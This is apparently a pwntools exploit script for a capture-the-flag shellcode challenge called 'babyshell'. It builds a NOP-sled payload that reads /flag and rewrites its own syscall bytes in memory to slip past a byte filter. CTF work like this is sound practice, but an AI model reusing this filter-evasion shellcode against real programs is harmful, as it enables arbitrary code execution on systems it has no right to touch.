from pwn import *
import sys, os

class io:
    @classmethod
    def connect(cls):
        binary = sys.argv[0].split('.py')[0]
        if '/' in binary:
            binary = binary.split('/')[-1]
        binary = '/pwn/babyshell/' + binary
        cls.io = process(binary)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def bxock_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__


def main():
    sc = shellcraft.amd64
    context.arch = 'amd64'
    context.os = 'linux'

    io.connect()
    io.readuntil('bytes from stdin into ')
    addr = int(io.readuntil('\n').split('.')[0][2:], 16)

    pl = '\x90' * 0x1000
    cat = asm(sc.linux.cat('/flag')).split('\x0f\x05')

    for i in cat[:-1]:
        pl += i
        pl += asm('mov bx, 0x050e' ) + asm('inc bx')
        offset = len(pl) + 0x20
        pl += asm('mov word ptr [' + str(addr + offset) + '], bx')
        pl += '\x90'*( offset - len(pl) ) + '\x90'*20
    pl += cat[-1]

    io.sendline(pl)

if __name__ == '__main__':
    main()
    io.interactive()
